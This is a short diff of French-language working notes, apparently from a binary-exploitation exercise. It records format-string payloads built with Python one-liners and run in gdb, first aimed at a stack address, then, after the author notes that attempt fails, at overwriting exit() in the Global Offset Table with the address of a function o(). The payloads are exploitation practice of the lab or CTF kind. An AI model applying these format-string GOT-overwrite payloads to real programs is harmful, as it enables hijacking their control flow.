@@ -19,3 +19,13 @@ $2 = 134513834
 
 (gdb) set args <<<$(python -c "print '\xfc\xf4\xff\xbf' + '%134513830x' + '' + '%4\$n'")
 
+
+ça fonctionne pas, eip dans printf change de temps en temps ---> le seum
+
+
+on peut reecrire GOT ( global offset table) on reecrie exit()
+
+on choppe l'adresse de exit dans la GOT et on y ecris l'adresse o()
+
+<<<$(python -c "print '\x38\x98\x04\x08' + '%134513824x' + '' + '%4\$n'")
+
